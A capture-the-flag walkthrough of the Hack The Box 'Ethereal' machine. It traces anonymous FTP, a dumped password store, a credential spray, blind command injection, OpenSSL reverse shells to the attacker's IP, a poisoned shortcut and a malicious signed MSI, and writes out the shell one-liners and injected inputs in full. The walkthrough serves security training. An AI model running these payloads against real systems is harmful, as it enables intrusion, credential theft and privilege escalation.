---
icon: dice-d6
cover: ../../../../.gitbook/assets/Screenshot 2026-02-23 021104.png
coverY: 0
---

# HTB-ETHEREAL

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan (TCP)

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ rustscan -a 10.10.10.106 blah blah
```

```
Open 10.10.10.106:21
Open 10.10.10.106:80
Open 10.10.10.106:8080

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed
80/tcp   open  http       Microsoft IIS httpd 10.0
8080/tcp open  http-proxy Microsoft HTTPAPI httpd 2.0
Service Info: OS: Windows
```

**Why this matters:** IIS 10.0 indicates Windows 10 or Server 2016/2019. Anonymous FTP is an immediate priority it often contains sensitive files left by developers. Port 8080 returning "Bad Request" without the correct hostname suggests virtual host routing.

#### Port Scan (UDP)

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo nmap -sU -p- --min-rate 10000 -oA scans/nmap-udp 10.10.10.106
```

All UDP ports return `open|filtered` — UDP is fully firewalled.

***

### FTP -TCP 21

#### Anonymous Login

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ ftp 10.10.10.106
Name: anonymous
Password: [blank]

ftp> dir
07-10-18  binaries/
09-02-09  CHIPSET.txt
01-12-03  DISK1.zip
01-22-11  edb143en.exe
01-18-11  FDISK.zip
07-10-18  New folder/
07-10-18  New folder (2)/
07-09-18  subversion-1.10.0/
11-12-16  teamcity-server-log4j.xml
```

Switch to binary mode before downloading:

```
ftp> bin
ftp> get DISK1.zip
ftp> get FDISK.zip
```

#### Extract Disk Images

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ unzip DISK1.zip
inflating: DISK1
inflating: DISK2

┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ unzip FDISK.zip
inflating: FDISK

┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ file FDISK DISK1 DISK2
FDISK: DOS/MBR boot sector ... FAT (12 bit)
DISK1: DOS/MBR boot sector ... FAT (12 bit)
DISK2: DOS/MBR boot sector ... FAT (12 bit)
```

Check filesystem labels:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ e2label FDISK
FDISK contains a vfat file system labelled 'PASSWORDS'
```

**Why this matters:** A disk image labelled `PASSWORDS` is the immediate priority.

#### Mount and Inspect

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo mount -o loop FDISK /mnt/fdisk

┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ tree /mnt/fdisk/
/mnt/fdisk/
└── pbox
    ├── pbox.dat
    └── pbox.exe
```

***

### PasswordBox Credential Extraction

#### Setup on Linux

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo apt install libncurses5:i386 bwbasic
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ cp /mnt/fdisk/pbox/pbox.dat ~/.pbox.dat
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ cp /mnt/fdisk/pbox/pbox.exe ./pbox
```

The Linux pbox client reads from `~/.pbox.dat`. Running it prompts for the master password — trial and error reveals `password`.

#### Dump All Credentials

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ ./pbox --dump
Enter your master password: password

databases          ->  7oth3B@tC4v3!
msdn               ->  alan@ethereal.co / P@ssword1!
learning           ->  alan2 / learn1ng!
ftp drop           ->  Watch3r
backup             ->  alan / Ex3cutiv3Backups
website uploads    ->  R3lea5eR3@dy#
truecrypt          ->  Password8
management server  ->  !C414m17y57r1k3s4g41n!
svn                ->  alan53 / Ch3ck1ToU7>
```

**Why this matters:** Developers storing credentials in disk images left on anonymous FTP is a critical misconfiguration. The entire credential set is now compromised.

Build wordlists:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ cat usernames.txt
alan
alan2
alan53
alan@ethereal.co

┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ cat passwords.txt
7oth3B@tC4v3!
P@ssword1!
learn1ng!
Watch3r
Ex3cutiv3Backups
R3lea5eR3@dy#
Password8
!C414m17y57r1k3s4g41n!
Ch3ck1ToU7>
```

***

### Website -TCP 80

The main site runs on IIS. The Admin menu contains a "Ping" option that redirects to `ethereal.htb:8080`. This reveals the hostname.

Add to `/etc/hosts`:

```
10.10.10.106 ethereal.htb
```

***

### Website -TCP 8080

#### Hostname Required

Without the correct `Host` header, port 8080 returns "Bad Request". With `ethereal.htb` configured, it serves HTTP Basic Auth.

#### Credential Spray with Hydra

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ hydra -L usernames.txt -P passwords.txt -s 8080 -f ethereal.htb http-get /

[8080][http-get] host: ethereal.htb  login: alan  password: !C414m17y57r1k3s4g41n!
```

**Why this matters:** Credential reuse — the "management server" entry from pbox maps directly to this HTTP Basic Auth endpoint.

***

### Command Injection Discovery

The Ping panel at port 8080 runs ping against a submitted IP. Testing blind injection by appending a second command using Windows `&`:

```
Input: 127.0.0.1 & ping 10.10.14.32
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo tcpdump -ni tun0 icmp

IP 10.10.10.106 > 10.10.14.32: ICMP echo request (×5 — Windows default)
```

**Why this matters:** The Windows ping default is 4 requests; receiving 5 confirms the injected `ping` ran separately from the original 2-ping script — unambiguous blind RCE.

#### Establishing Available Channels

PowerShell and certutil both fail silently (firewall drops outbound TCP). DNS works:

```
Input: & nslookup test.com 10.10.14.32
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo tcpdump -ni tun0 udp port 53

IP 10.10.10.106 > 10.10.14.32: DNS A? test.com.
```

DNS outbound is open. This becomes our C2 channel for the initial shell.

#### Firewall Port Discovery — OpenSSL Port Scan

OpenSSL is present at `c:\progra~2\openss~1.0\bin\openssl.exe`. We use it to probe for allowed outbound TCP ports by looping connection attempts and watching for SYN packets:

```
Input: quiet FOR /L %G IN (1,1,200) DO (c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:%G)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ sudo tcpdump -ni tun0 "src host 10.10.10.106 and tcp[tcpflags] == (tcp-syn)"

IP 10.10.10.106 > 10.10.14.32.73:  Flags [S]
IP 10.10.10.106 > 10.10.14.32.136: Flags [S]
```

Confirmed via firewall rules inspection:

```
Input: cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:"
...
Rule Name: Allow TCP Ports 73, 136
```

**Why this matters:** Ports 73 and 136 are the only outbound TCP allowed — everything else is dropped. OpenSSL on the target becomes our reverse shell binary since PowerShell, nc, and certutil are all blocked.

***

### Shell as alan (OpenSSL Reverse Shell)

#### Generate SSL Certificate

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

#### Test Connectivity

```
Input: quiet ( echo "test" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73 )
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ openssl s_server -quiet -key key.pem -cert cert.pem -port 73
"test"
```

#### Spawn Shell (Two-Port Technique)

The technique pipes commands from port 73 into `cmd.exe` and returns output on port 136 — effectively splitting stdin and stdout across two encrypted channels.

Start both listeners:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ rlwrap openssl s_server -quiet -key key.pem -cert cert.pem -port 73   [commands go here]

┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ openssl s_server -quiet -key key.pem -cert cert.pem -port 136         [output appears here]
```

Send the shell command via command injection:

```
Input: quiet start cmd /c "c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136"
```

Output on port 136:

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
ethereal\alan
```

**Why this matters:** `start` is critical — it spawns the process independently so it persists after the web request times out. Without it, the connection dies when the HTTP response is sent.

Type all commands into the port 73 window. Responses appear on port 136.

***

### Lateral Movement — alan → jorge

#### Enumeration

A note on alan's desktop hints at a shared shortcut:

```
c:\Users\alan\Desktop> type note-draft.txt
I've created a shortcut for VS on the Public Desktop to ensure we use the same version.
Please delete any existing shortcuts and use this one instead.
- Alan
```

The public desktop is hidden but accessible with `/a`:

```
c:\Users\Public\Desktop\Shortcuts> dir
Visual Studio 2017.lnk   6,125 bytes
```

Permission check confirms we can write here:

```
c:\Users\Public\Desktop> icacls shortcuts
NT AUTHORITY\INTERACTIVE:(OI)(CI)(M,DC)
Everyone:(OI)(CI)(M)
```

The `.lnk` file shows `jorge` has full control over it — and jorge is the one clicking it via a scheduled bat script. This is our path to jorge.

#### Exfil the lnk for Analysis

Base64 encode and exfiltrate over the shell:

```
c:\Users\Public\Desktop\Shortcuts> \progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in "Visual Studio 2017.lnk"
```

Copy the output and decode locally:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ base64 -d vs_b64.txt > vs.lnk
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ python /opt/pylnker/pylnker.py vs.lnk

Base Path: D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\devenv.exe
Working Dir: D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE
```

#### Poison the lnk

**Method 1 — Windows VM (Properties Edit)**

Copy `vs.lnk` to a Windows VM, right-click → Properties → change Target to:

```
C:\Windows\System32\cmd.exe /c c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136
```

Verify with pylnker:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ python /opt/pylnker/pylnker.py vs-mod.lnk

Base Path: C:\Windows\System32\cmd.exe
Command Line: /c c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136
```

**Method 2 — LNKUp (Python, on Kali)**

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ python /opt/LNKUp/generate.py --host localhost --type ntlm --out vs-mod.lnk \
  --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136"
```

#### Upload Poisoned lnk to Target

Kill the output on port 136 temporarily to use it as a file transfer channel. On the target side via the port 73 shell:

```
c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136 > c:\users\public\desktop\shortcuts\lnk.lnk
```

Serve the file from attacker:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem -lvp 136 < vs-mod.lnk
```

Once transferred, overwrite the original:

```
copy /Y lnk.lnk "Visual Studio 2017.lnk"
```

Restart both openssl listeners and wait.

#### Shell as jorge

Within minutes, jorge's `open-program.bat` script clicks the poisoned shortcut:

```
C:\Users\jorge\Documents> whoami
ethereal\jorge
```

```
C:\Users\jorge\Desktop> type user.txt
2b9a4ca0************************
```

**Why this matters:** The scheduled task simulates a real user — a classic spear-phishing/shortcut poisoning scenario made possible by world-writable shared directories. The attack chain mirrors real enterprise lateral movement techniques.

***

### Privilege Escalation - jorge → rupal → root

#### Enumeration from jorge

Checking drives:

```
C:\Users\jorge\Documents> fsutil fsinfo drives
Drives: C:\ D:\
```

`D:\Certs` contains a Certificate Authority:

```
D:\Certs> dir
MyCA.cer   772 bytes
MyCA.pvk  1196 bytes
```

`D:\DEV\MSIs` contains a note:

```
D:\DEV\MSIs> type note.txt
Please drop MSIs that need testing into this folder - I will review regularly.
Certs have been added to the store already.
- Rupal
```

**Why this matters:** Rupal runs MSIs from this folder automatically and the CA cert is already trusted in the system store — we can create a validly signed malicious MSI.

#### Exfil the CA Cert and Key

```
c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.cer
c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.pvk
```

Copy output, decode locally:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ base64 -d myca_cer.b64 > myca.cer
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ base64 -d myca_pvk.b64 > myca.pvk
```

#### Create Code Signing Certificate (Windows VM)

Using Microsoft SDK tools:

```
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin> makecert.exe -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic \Users\sn0x\Desktop\myca.cer -iv \Users\sn0x\Desktop\myca.pvk -sv \Users\sn0x\Desktop\MySPC.pvk \Users\sn0x\Desktop\MySPC.cer
Succeeded

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin> pvk2pfx.exe -pvk \Users\sn0x\Desktop\MySPC.pvk -spc \Users\sn0x\Desktop\MySPC.cer -pfx \Users\sn0x\Desktop\MySPC.pfx
```

#### Create Malicious MSI (EMCO MSI Package Builder)

Create a new project, add a Custom Action with the same double-OpenSSL shell payload:

```
C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136
```

Export the MSI.

#### Sign the MSI

```
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin> signtool.exe sign /v /f \Users\sn0x\Desktop\MySPC.pfx /tr "http://timestamp.digicert.com" /td sha256 /fd sha256 \Users\sn0x\Desktop\Ethereal\Ethereal.msi

Successfully signed and timestamped: Ethereal.msi
```

**Why this matters:** Rupal's launcher verifies MSIs against the trusted CA store before running them. An unsigned or wrongly-signed MSI would fail silently — the CA cert extracted from the target is the exact key needed to produce a trusted signature.

#### Upload MSI to Target

Kill port 136 output temporarily. On the port 73 shell:

```
c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.32:136 > c:\users\public\desktop\shortcuts\msi.msi
```

Serve from attacker:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ethereal]
└─$ ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem -lvp 136 < Ethereal.msi
```

Once transferred, drop it in the target directory:

```
copy msi.msi "d:\dev\msis\Ethereal.msi"
```

Restart both openssl listeners and wait (rupal's script checks every 5 minutes).

#### Shell as rupal

```
C:\Windows\system32> whoami
ethereal\rupal
```

***

### Attack Flow

```
Anonymous FTP → DISK images → FDISK labelled "PASSWORDS"
    |
    +--> pbox password manager (master: "password") → --dump
         --> 9 credentials across users/services
             --> alan:!C414m17y57r1k3s4g41n! (HTTP Basic on port 8080)
                 |
                 +--> Ping panel → blind command injection (&)
                      --> DNS exfil (UDP 53 open) → initial enumeration
                      --> OpenSSL port scan → TCP 73, 136 allowed outbound
                      --> OpenSSL two-port reverse shell as alan (www-data context)
                          |
                          +--> note-draft.txt → shared .lnk on Public Desktop
                               --> Writable by everyone
                               --> jorge has Full Control → clicking via bat script
                               --> Poisoned .lnk → OpenSSL shell as jorge
                                   --> user.txt
                                   |
                                   +--> D:\Certs\MyCA.cer + MyCA.pvk (exfil)
                                        D:\DEV\MSIs\ (Rupal drops MSIs here)
                                        --> makecert + pvk2pfx → code signing cert
                                        --> EMCO MSI Package Builder → malicious MSI
                                        --> signtool signs with MyCA chain
                                        --> Upload → D:\DEV\MSIs\ → rupal runs it
                                            --> OpenSSL shell as rupal (admin)
                                                --> root.txt
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
